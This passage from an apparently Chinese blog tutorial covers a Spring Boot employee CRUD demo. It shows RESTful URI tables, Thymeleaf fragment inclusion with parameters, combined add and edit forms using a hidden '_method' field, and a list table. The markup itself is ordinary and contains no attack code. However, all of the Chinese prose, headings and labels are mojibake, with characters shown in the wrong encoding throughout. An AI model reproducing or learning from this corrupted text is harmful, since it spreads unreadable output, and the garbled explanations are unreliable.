é™¤</td><td>deleteEmp?id&#x3D;1</td><td>emp&#x2F;{id}â€”DELETE</td></tr></tbody></table><p>2ï¼‰ã€å®éªŒçš„è¯·æ±‚æ¶æ„;</p><table><thead><tr><th>å®éªŒåŠŸèƒ½</th><th>è¯·æ±‚URI</th><th>è¯·æ±‚æ–¹å¼</th></tr></thead><tbody><tr><td>æŸ¥è¯¢æ‰€æœ‰å‘˜å·¥</td><td>emps</td><td>GET</td></tr><tr><td>æŸ¥è¯¢æŸä¸ªå‘˜å·¥(æ¥åˆ°ä¿®æ”¹é¡µé¢)</td><td>emp&#x2F;1</td><td>GET</td></tr><tr><td>æ¥åˆ°æ·»åŠ é¡µé¢</td><td>emp</td><td>GET</td></tr><tr><td>æ·»åŠ å‘˜å·¥</td><td>emp</td><td>POST</td></tr><tr><td>æ¥åˆ°ä¿®æ”¹é¡µé¢ï¼ˆæŸ¥å‡ºå‘˜å·¥è¿›è¡Œä¿¡æ¯å›æ˜¾ï¼‰</td><td>emp&#x2F;1</td><td>GET</td></tr><tr><td>ä¿®æ”¹å‘˜å·¥</td><td>emp</td><td>PUT</td></tr><tr><td>åˆ é™¤å‘˜å·¥</td><td>emp&#x2F;1</td><td>DELETE</td></tr></tbody></table><p>3ï¼‰ã€å‘˜å·¥åˆ—è¡¨ï¼š</p><h4><span id="thymeleafå…¬å…±é¡µé¢å…ƒç´ æŠ½å–">thymeleafå…¬å…±é¡µé¢å…ƒç´ æŠ½å–</span></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1ã€æŠ½å–å…¬å…±ç‰‡æ®µ</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:fragment</span>=<span class="string">&quot;copy&quot;</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;copy;</span> 2011 The Good Thymes Virtual Grocery</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">2ã€å¼•å…¥å…¬å…±ç‰‡æ®µ</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:insert</span>=<span class="string">&quot;~&#123;footer :: copy&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">~&#123;templatename::selector&#125;ï¼šæ¨¡æ¿å::é€‰æ‹©å™¨</span><br><span class="line">~&#123;templatename::fragmentname&#125;:æ¨¡æ¿å::ç‰‡æ®µå</span><br><span class="line"></span><br><span class="line">3ã€é»˜è®¤æ•ˆæœï¼š</span><br><span class="line">insertçš„å…¬å…±ç‰‡æ®µåœ¨divæ ‡ç­¾ä¸­</span><br><span class="line">å¦‚æœä½¿ç”¨th:insertç­‰å±æ€§è¿›è¡Œå¼•å…¥ï¼Œå¯ä»¥ä¸ç”¨å†™~&#123;&#125;ï¼š</span><br><span class="line">è¡Œå†…å†™æ³•å¯ä»¥åŠ ä¸Šï¼š[[~&#123;&#125;]];[(~&#123;&#125;)]ï¼›</span><br></pre></td></tr></table></figure><p>ä¸‰ç§å¼•å…¥å…¬å…±ç‰‡æ®µçš„thå±æ€§ï¼š</p><p><strong>th:insert</strong>ï¼šå°†å…¬å…±ç‰‡æ®µæ•´ä¸ªæ’å…¥åˆ°å£°æ˜å¼•å…¥çš„å…ƒç´ ä¸­</p><p><strong>th:replace</strong>ï¼šå°†å£°æ˜å¼•å…¥çš„å…ƒç´ æ›¿æ¢ä¸ºå…¬å…±ç‰‡æ®µ</p><p><strong>th:include</strong>ï¼šå°†è¢«å¼•å…¥çš„ç‰‡æ®µçš„å†…å®¹åŒ…å«è¿›è¿™ä¸ªæ ‡ç­¾ä¸­</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">footer</span> <span class="attr">th:fragment</span>=<span class="string">&quot;copy&quot;</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;copy;</span> 2011 The Good Thymes Virtual Grocery</span><br><span class="line"><span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"></span><br><span class="line">å¼•å…¥æ–¹å¼</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:insert</span>=<span class="string">&quot;footer :: copy&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:replace</span>=<span class="string">&quot;footer :: copy&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:include</span>=<span class="string">&quot;footer :: copy&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">æ•ˆæœ</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">footer</span>&gt;</span></span><br><span class="line">    <span class="symbol">&amp;copy;</span> 2011 The Good Thymes Virtual Grocery</span><br><span class="line">    <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;copy;</span> 2011 The Good Thymes Virtual Grocery</span><br><span class="line"><span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;copy;</span> 2011 The Good Thymes Virtual Grocery</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¼•å…¥ç‰‡æ®µçš„æ—¶å€™ä¼ å…¥å‚æ•°ï¼š </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">&quot;col-md-2 d-none d-md-block bg-light sidebar&quot;</span> <span class="attr">id</span>=<span class="string">&quot;sidebar&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;sidebar-sticky&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;nav flex-column&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav-item&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;nav-link active&quot;</span></span></span><br><span class="line"><span class="tag">                   <span class="attr">th:class</span>=<span class="string">&quot;$&#123;activeUri==&#x27;main.html&#x27;?&#x27;nav-link active&#x27;:&#x27;nav-link&#x27;&#125;&quot;</span></span></span><br><span class="line"><span class="tag">                   <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/main.html&#125;&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;24&quot;</span> <span class="attr">height</span>=<span class="string">&quot;24&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 24 24&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;none&quot;</span> <span class="attr">stroke</span>=<span class="string">&quot;currentColor&quot;</span> <span class="attr">stroke-width</span>=<span class="string">&quot;2&quot;</span> <span class="attr">stroke-linecap</span>=<span class="string">&quot;round&quot;</span> <span class="attr">stroke-linejoin</span>=<span class="string">&quot;round&quot;</span> <span class="attr">class</span>=<span class="string">&quot;feather feather-home&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">&quot;M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">polyline</span> <span class="attr">points</span>=<span class="string">&quot;9 22 9 12 15 12 15 22&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">polyline</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">                    Dashboard <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;sr-only&quot;</span>&gt;</span>(current)<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--å¼•å…¥ä¾§è¾¹æ ;ä¼ å…¥å‚æ•°--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:replace</span>=<span class="string">&quot;commons/bar::#sidebar(activeUri=&#x27;emps&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h3><span id="6-crud-å‘˜å·¥æ·»åŠ ">6ï¼‰ã€CRUD-å‘˜å·¥æ·»åŠ </span></h3><p>æ·»åŠ é¡µé¢</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>LastName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;zhangsan&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;zhangsan@atguigu.com&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Gender<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-check form-check-inline&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;form-check-input&quot;</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">&quot;form-check-label&quot;</span>&gt;</span>ç”·<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-check form-check-inline&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;form-check-input&quot;</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">&quot;form-check-label&quot;</span>&gt;</span>å¥³<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>department<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span>&gt;</span>1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span>&gt;</span>2<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span>&gt;</span>3<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span>&gt;</span>4<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span>&gt;</span>5<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Birth<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;zhangsan&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span>&gt;</span>æ·»åŠ <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æäº¤çš„æ•°æ®æ ¼å¼ä¸å¯¹ï¼šç”Ÿæ—¥ï¼šæ—¥æœŸï¼›</p><p>2017-12-12ï¼›2017&#x2F;12&#x2F;12ï¼›2017.12.12ï¼›</p><p>æ—¥æœŸçš„æ ¼å¼åŒ–ï¼›SpringMVCå°†é¡µé¢æäº¤çš„å€¼éœ€è¦è½¬æ¢ä¸ºæŒ‡å®šçš„ç±»å‹;</p><p>2017-12-12â€”Dateï¼› ç±»å‹è½¬æ¢ï¼Œæ ¼å¼åŒ–;</p><p>é»˜è®¤æ—¥æœŸæ˜¯æŒ‰ç…§&#x2F;çš„æ–¹å¼ï¼›</p><h3><span id="7-crud-å‘˜å·¥ä¿®æ”¹">7ï¼‰ã€CRUD-å‘˜å·¥ä¿®æ”¹</span></h3><p>ä¿®æ”¹æ·»åŠ äºŒåˆä¸€è¡¨å•</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--éœ€è¦åŒºåˆ†æ˜¯å‘˜å·¥ä¿®æ”¹è¿˜æ˜¯æ·»åŠ ï¼›--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">th:action</span>=<span class="string">&quot;@&#123;/emp&#125;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--å‘é€putè¯·æ±‚ä¿®æ”¹å‘˜å·¥æ•°æ®--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1ã€SpringMVCä¸­é…ç½®HiddenHttpMethodFilter;ï¼ˆSpringBootè‡ªåŠ¨é…ç½®å¥½çš„ï¼‰</span></span><br><span class="line"><span class="comment">2ã€é¡µé¢åˆ›å»ºä¸€ä¸ªpostè¡¨å•</span></span><br><span class="line"><span class="comment">3ã€åˆ›å»ºä¸€ä¸ªinputé¡¹ï¼Œname=&quot;_method&quot;;å€¼å°±æ˜¯æˆ‘ä»¬æŒ‡å®šçš„è¯·æ±‚æ–¹å¼</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_method&quot;</span> <span class="attr">value</span>=<span class="string">&quot;put&quot;</span> <span class="attr">th:if</span>=<span class="string">&quot;$&#123;emp!=null&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">th:if</span>=<span class="string">&quot;$&#123;emp!=null&#125;&quot;</span> <span class="attr">th:value</span>=<span class="string">&quot;$&#123;emp.id&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>LastName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;lastName&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;zhangsan&quot;</span> <span class="attr">th:value</span>=<span class="string">&quot;$&#123;emp!=null&#125;?$&#123;emp.lastName&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;zhangsan@atguigu.com&quot;</span> <span class="attr">th:value</span>=<span class="string">&quot;$&#123;emp!=null&#125;?$&#123;emp.email&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Gender<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-check form-check-inline&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;form-check-input&quot;</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> <span class="attr">th:checked</span>=<span class="string">&quot;$&#123;emp!=null&#125;?$&#123;emp.gender==1&#125;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">&quot;form-check-label&quot;</span>&gt;</span>ç”·<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-check form-check-inline&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;form-check-input&quot;</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span> <span class="attr">th:checked</span>=<span class="string">&quot;$&#123;emp!=null&#125;?$&#123;emp.gender==0&#125;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">&quot;form-check-label&quot;</span>&gt;</span>å¥³<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>department<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--æäº¤çš„æ˜¯éƒ¨é—¨çš„id--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">name</span>=<span class="string">&quot;department.id&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">th:selected</span>=<span class="string">&quot;$&#123;emp!=null&#125;?$&#123;dept.id == emp.department.id&#125;&quot;</span> <span class="attr">th:value</span>=<span class="string">&quot;$&#123;dept.id&#125;&quot;</span> <span class="attr">th:each</span>=<span class="string">&quot;dept:$&#123;depts&#125;&quot;</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;dept.departmentName&#125;&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Birth<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;birth&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;zhangsan&quot;</span> <span class="attr">th:value</span>=<span class="string">&quot;$&#123;emp!=null&#125;?$&#123;#dates.format(emp.birth, &#x27;yyyy-MM-dd HH:mm&#x27;)&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;emp!=null&#125;?&#x27;ä¿®æ”¹&#x27;:&#x27;æ·»åŠ &#x27;&quot;</span>&gt;</span>æ·»åŠ <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h3><span id="8-crud-å‘˜å·¥åˆ é™¤">8ï¼‰ã€CRUD-å‘˜å·¥åˆ é™¤</span></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">th:each</span>=<span class="string">&quot;emp:$&#123;emps&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;emp.id&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>[[$&#123;emp.lastName&#125;]]<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;emp.email&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;emp.gender&#125;==0?&#x27;å¥³&#x27;:&#x27;ç”·&#x27;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;emp.department.departmentName&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#dates.format(emp.birth, &#x27;yyyy-MM-dd HH:mm&#x27;)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span 